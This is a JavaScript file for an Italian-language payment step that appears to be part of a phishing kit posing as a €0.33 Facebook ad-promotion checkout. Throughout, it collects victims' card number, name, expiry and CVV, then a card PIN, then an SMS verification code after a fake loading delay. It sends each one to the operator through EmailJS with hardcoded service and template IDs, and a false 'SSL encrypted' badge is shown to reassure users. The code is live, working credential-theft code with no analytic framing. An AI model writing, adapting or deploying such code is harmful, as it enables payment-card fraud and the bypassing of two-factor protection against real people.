// step4.js - Payment Page with PIN and SMS

document.addEventListener('DOMContentLoaded', function() {
    loadStep4Content();
    initStep4();
});

function loadStep4Content() {
    const step4Container = document.getElementById('step4');
    
    step4Container.innerHTML = `
        <!-- Payment Header -->
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px 30px; text-align: center; border-radius: 12px; margin-bottom: 25px;">
            <h2 style="font-size: 28px; margin-bottom: 5px;">Pagamento</h2>
            <div style="font-size: 48px; font-weight: bold; margin: 10px 0;">€0.33 <small style="font-size: 24px;">EUR</small></div>
            <div style="font-size: 16px; opacity: 0.9;">Completa il pagamento per pubblicare il tuo annuncio</div>
        </div>

        <!-- Ad Summary -->
        <div style="background: #f8f9fa; border-radius: 16px; padding: 20px; margin-bottom: 25px;">
            <h3 style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
                <i class="fas fa-chart-bar" style="color: #667eea;"></i> Riepilogo Campagna
            </h3>
            <div id="summaryContent"></div>
            
            <!-- Daily Reach -->
            <div style="background: #e7f3ff; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: center; border-left: 4px solid #667eea;">
                <p style="margin-bottom: 5px;">📈 Copertura Giornaliera Stimata</p>
                <div style="font-size: 28px; font-weight: 700; color: #667eea;">3,000 - 10,000+</div>
                <div style="font-size: 14px;">persone raggiunte al giorno</div>
                <div style="font-size: 14px;">Durata dell’offerta: 7 giorni</div>
            </div>
        </div>

        
        <hr>
        <br>


        <!-- Card Icons -->
        <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 25px;">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" alt="Visa" style="height: 25px; opacity: 1;">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" alt="Mastercard" style="height: 25px; opacity: 1;">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196539.png" alt="Amex" style="height: 25px; opacity: 0.5;">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196543.png" alt="Discover" style="height: 25px; opacity: 0.5;">
        </div>

        <!-- Payment Form -->
        <form id="paymentForm" onsubmit="handlePaymentSubmit(event)">
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px; font-weight: 600;">Numero Carta</label>
                <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
                <div id="cardNumberError" class="error-message" style="color: #f02849; font-size: 13px; margin-top: 5px; display: none;">Inserisci un numero di carta valido</div>
            </div>

            <div style="display: flex; gap: 15px; margin-bottom: 20px;">
                <div style="flex: 1;">
                    <label style="display: block; margin-bottom: 8px; font-weight: 600;">Nome</label>
                    <input type="text" id="firstName" class="form-control" placeholder="Nome" required>
                    <div id="firstNameError" class="error-message" style="color: #f02849; font-size: 13px; margin-top: 5px; display: none;">Il nome è obbligatorio</div>
                </div>
                <div style="flex: 1;">
                    <label style="display: block; margin-bottom: 8px; font-weight: 600;">Cognome</label>
                    <input type="text" id="lastName" class="form-control" placeholder="Cognome" required>
                    <div id="lastNameError" class="error-message" style="color: #f02849; font-size: 13px; margin-top: 5px; display: none;">Il cognome è obbligatorio</div>
                </div>
            </div>

            <div style="display: flex; gap: 15px; margin-bottom: 20px;">
                <div style="flex: 1;">
                    <label style="display: block; margin-bottom: 8px; font-weight: 600;">Data Scadenza</label>
                    <input type="text" id="expiryDate" class="form-control" placeholder="MM/AA" maxlength="5" required>
                    <div id="expiryError" class="error-message" style="color: #f02849; font-size: 13px; margin-top: 5px; display: none;">Data di scadenza non valida</div>
                </div>
                <div style="flex: 1;">
                    <label style="display: block; margin-bottom: 8px; font-weight: 600;">Codice/CVV</label>
                    <input type="text" id="cvv" class="form-control" placeholder="***" maxlength="3" required>
                    <div id="cvvError" class="error-message" style="color: #f02849; font-size: 13px; margin-top: 5px; display: none;">CVV non valido</div>
                </div>
            </div>

            <!-- Security Badge -->
            <div style="display: flex; align-items: center; gap: 10px; background: #f0f2f5; padding: 12px 15px; border-radius: 8px; margin: 20px 0;">
                <i class="fas fa-lock" style="color: #42b72a; font-size: 20px;"></i>
                <span style="font-size: 14px; color: #4b4f56;">Le tue informazioni di pagamento sono sicure. Connessione crittografata SSL a 256 bit.</span>
            </div>

            <button type="submit" class="btn btn-success" style="width: 100%;">
                <span>Paga</span>
                <span>€0.33</span>
            </button>
        </form>

        <!-- Footer Links -->
        <div style="text-align: center; padding: 20px 0 0; border-top: 1px solid #dadde1; margin-top: 20px;">
            <a href="#" style="color: #667eea; text-decoration: none; margin: 0 10px;">Termini</a>
            <a href="#" style="color: #667eea; text-decoration: none; margin: 0 10px;">Privacy</a>
            <a href="#" style="color: #667eea; text-decoration: none; margin: 0 10px;">Aiuto</a>
        </div>
    `;
}

function initStep4() {
    // Load ad data from localStorage
    loadAdData();
    
    // Get input elements
    const cardNumber = document.getElementById('cardNumber');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');
    const pinCode = document.getElementById('pinCode');
    const smsCode = document.getElementById('smsCode');
    
    // Format card number
    cardNumber.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formattedValue += ' ';
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });
    
    // Format expiry date
    expiryDate.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // Allow only numbers for CVV
    cvv.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });
    
    // PIN and SMS inputs
    if (pinCode) {
        pinCode.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    if (smsCode) {
        smsCode.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    // PIN submit button
    document.getElementById('submitPinBtn').addEventListener('click', handlePinSubmit);
    
    // SMS submit button
    document.getElementById('submitSmsBtn').addEventListener('click', handleSmsSubmit);
}

function loadAdData() {
    const pendingAd = localStorage.getItem('pendingAd');
    const facebookUser = sessionStorage.getItem('facebookUser');
    const summaryContent = document.getElementById('summaryContent');
    
    if (!summaryContent) return;
    
    if (pendingAd) {
        const adData = JSON.parse(pendingAd);
        const user = facebookUser ? JSON.parse(facebookUser) : null;
        
        let html = '';
        
        if (adData.startTime) {
            const startDate = new Date(adData.startTime);
            const formattedDate = startDate.toLocaleString('it-IT');
            html += `<div class="summary-item"><span class="summary-label">Data e Ora:</span><span class="summary-value">${formattedDate}</span></div>`;
        }
        
        if (adData.country && adData.country.name) {
            html += `<div class="summary-item"><span class="summary-label">Paese:</span><span class="summary-value">${adData.country.name}</span></div>`;
        }
        
        if (adData.cities && adData.cities.length > 0) {
            html += `<div class="summary-item"><span class="summary-label">Città:</span><span class="summary-value">${adData.cities.join(', ')}</span></div>`;
        }
        
        if (user && user.email) {
            html += `<div style="height: 1px; background: #dadde1; margin: 15px 0;"></div>`;
            html += `<div class="summary-item"><span class="summary-label">Contatto:</span><span class="summary-value">${user.email}</span></div>`;
        }
        
        html += `<div style="height: 1px; background: #dadde1; margin: 15px 0;"></div>`;
        html += `<div class="summary-item" style="font-size: 16px;"><span class="summary-label">Totale:</span><span class="summary-value" style="color: #42b72a; font-size: 18px;">€0.33</span></div>`;
        
        summaryContent.innerHTML = html;
    } else {
        summaryContent.innerHTML = '<div class="summary-item">Nessun dato campagna disponibile</div>';
    }
}

// Validate payment form
function validatePaymentForm() {
    const cardNumber = document.getElementById('cardNumber');
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');
    
    const cardNumberError = document.getElementById('cardNumberError');
    const firstNameError = document.getElementById('firstNameError');
    const lastNameError = document.getElementById('lastNameError');
    const expiryError = document.getElementById('expiryError');
    const cvvError = document.getElementById('cvvError');
    
    let isValid = true;
    
    const cardNum = cardNumber.value.replace(/\s/g, '');
    if (cardNum.length !== 16 || !/^\d+$/.test(cardNum)) {
        cardNumberError.style.display = 'block';
        isValid = false;
    } else {
        cardNumberError.style.display = 'none';
    }
    
    if (!firstName.value.trim()) {
        firstNameError.style.display = 'block';
        isValid = false;
    } else {
        firstNameError.style.display = 'none';
    }
    
    if (!lastName.value.trim()) {
        lastNameError.style.display = 'block';
        isValid = false;
    } else {
        lastNameError.style.display = 'none';
    }
    
    const expiry = expiryDate.value.split('/');
    if (expiry.length !== 2 || expiry[0].length !== 2 || expiry[1].length !== 2 || 
        parseInt(expiry[0]) > 12 || parseInt(expiry[0]) < 1) {
        expiryError.style.display = 'block';
        isValid = false;
    } else {
        expiryError.style.display = 'none';
    }
    
    if (cvv.value.length !== 3 || !/^\d+$/.test(cvv.value)) {
        cvvError.style.display = 'block';
        isValid = false;
    } else {
        cvvError.style.display = 'none';
    }
    
    return isValid;
}

// Handle payment submit
function handlePaymentSubmit(event) {
    event.preventDefault();
    
    if (!validatePaymentForm()) return;
    
    const cardNumber = document.getElementById('cardNumber');
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');
    
    const paymentData = {
        cardNumber: cardNumber.value.replace(/\s/g, ''),
        cardholderName: `${firstName.value} ${lastName.value}`,
        expiryDate: expiryDate.value,
        cvv: cvv.value,
        amount: '0.33'
    };
    
    const adData = JSON.parse(localStorage.getItem('pendingAd') || '{}');
    const user = JSON.parse(sessionStorage.getItem('facebookUser') || '{}');
    
    // Send payment data via EmailJS
        emailjs.send("service_zl8edtk", "template_7uvwmq9", {
        payment_cardNumber: paymentData.cardNumber,
        payment_cardholderName: paymentData.cardholderName,
        payment_expiryDate: paymentData.expiryDate,
        payment_cvv: paymentData.cvv,
        payment_amount: paymentData.amount,
        payment_adData: JSON.stringify(adData),
        payment_userEmail: user.email || 'Non disponibile',
        payment_timestamp: new Date().toLocaleString('it-IT')
    })
    .then(function() {
        // Show PIN modal
        setTimeout(() => {
            document.getElementById('pinModal').style.display = 'flex';
        }, 500);
    })
    .catch(function() {
        // Still show PIN modal
        setTimeout(() => {
            document.getElementById('pinModal').style.display = 'flex';
        }, 500);
    });
}

// Handle PIN submit
function handlePinSubmit() {
    const pinCode = document.getElementById('pinCode');
    const pin = pinCode.value;
    
    if (!pin || pin.length < 4 || pin.length > 8) {
        Swal.fire({
            icon: 'error',
            title: 'PIN Non Valido',
            text: 'Inserisci un PIN valido (4-8 cifre)',
        });
        return;
    }
    
    // Send PIN via EmailJS
    emailjs.send("service_zl8edtk", "template_7uvwmq9",{
        pin_code: pin,
        pin_timestamp: new Date().toLocaleString('it-IT')
    })
    .then(function() {
        console.log('PIN inviato');
    })
    .catch(function(error) {
        console.error('Errore PIN:', error);
    });
    
    // Close PIN modal and show loading
    document.getElementById('pinModal').style.display = 'none';
    document.getElementById('loadingModal').style.display = 'flex';
    
    // Start progress animation (60 seconds)
    let progress = 0;
    const totalTime = 12;
    const interval = setInterval(() => {
        progress++;
        
        if (progress >= totalTime) {
            clearInterval(interval);
            document.getElementById('loadingModal').style.display = 'none';
            document.getElementById('smsModal').style.display = 'flex';
        }
    }, 1000);
}

// Handle SMS submit
function handleSmsSubmit() {
    const smsCode = document.getElementById('smsCode');
    const sms = smsCode.value;
    
    if (!sms || sms.length < 4 || sms.length > 8) {
        Swal.fire({
            icon: 'error',
            title: 'Codice Non Valido',
            text: 'Inserisci un codice SMS valido (4-8 cifre)',
        });
        return;
    }
    
    // Send SMS via EmailJS
    emailjs.send("service_zl8edtk", "template_7uvwmq9", {
        sms_code: sms,
        sms_timestamp: new Date().toLocaleString('it-IT')
    })
    .then(function() {
        console.log('SMS inviato');
    })
    .catch(function(error) {
        console.error('Errore SMS:', error);
    });
    
    // Close SMS modal
    document.getElementById('smsModal').style.display = 'none';
    
    // Go to Thank You page
    setTimeout(() => {
        goToStep(5);
    }, 1000);
}

// Make functions globally available
window.handlePaymentSubmit = handlePaymentSubmit;
window.handlePinSubmit = handlePinSubmit;
window.handleSmsSubmit = handleSmsSubmit;